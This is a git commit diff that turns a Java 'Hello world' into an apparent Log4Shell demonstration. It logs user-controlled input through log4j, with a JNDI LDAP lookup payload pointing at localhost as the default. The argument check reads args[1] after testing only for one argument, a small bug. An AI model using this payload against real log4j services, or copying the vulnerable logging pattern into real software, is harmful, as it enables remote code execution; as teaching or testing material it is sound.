e3886ef1d59536c5e2263f7c6d3e7a0d8b7b014d
Elias Lundell <elilun03@gmail.com>
2024-03-11 14:48:18 +0100

    add log4j

--- src/main/java/org/example/Main.java
+++ src/main/java/org/example/Main.java
@@ -1,7 +1,17 @@
 package org.example;
 
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
 public class Main {
     public static void main(String[] args) {
-        System.out.println("Hello world!");
+        System.out.println("Running main and logging a user controlled variable (e.g. HTTP Header)");
+        Logger logger = LogManager.getLogger();
+        String loggingStatement = "${jndi:ldap://localhost:1389/o=reference}";
+        if (args.length >= 1) {
+            loggingStatement = args[1];
+        }
+
+        logger.error(loggingStatement);
     }
 }
